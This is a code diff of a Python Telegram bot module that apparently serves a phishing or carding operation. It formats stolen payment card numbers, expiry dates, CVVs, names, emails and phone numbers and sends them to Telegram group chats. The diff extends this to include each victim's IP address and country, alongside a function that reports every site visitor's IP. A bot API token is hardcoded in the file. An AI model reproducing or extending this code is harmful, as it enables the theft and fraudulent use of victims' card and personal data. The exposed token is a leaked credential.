@@ -2,17 +2,18 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from parserBIN import Bin
 import requests
 API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
+
 from telegram.error import TelegramError
 def escape_reserved_characters(text):
     # Список зарезервированных символов, которые нужно экранировать
     reserved_characters = ['_', '*', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
-    
+     
     # Экранируем каждый зарезервированный символ
     for char in reserved_characters:
         text = text.replace(char, f'\\{char}')
     
     return text
-def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel):
+def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
@@ -24,7 +25,7 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}')
+    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
     bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
     
 def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
@@ -64,9 +65,11 @@ def ne_pizdabol(card, chat_id='-4150791967'):
     except TelegramError as e:
         print(f"Failed to send message: {e}")
 
-def cheltut(ip):
+def cheltut(ip: str):
     try:
         chat_id='-4236427099'
+        if ip.find('176.101.2.213') != -1:
+            pass
         bot = Bot(token=API_TOKEN)
         message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip} \n🌏: `{get_country_by_ip(ip)}`')
         bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
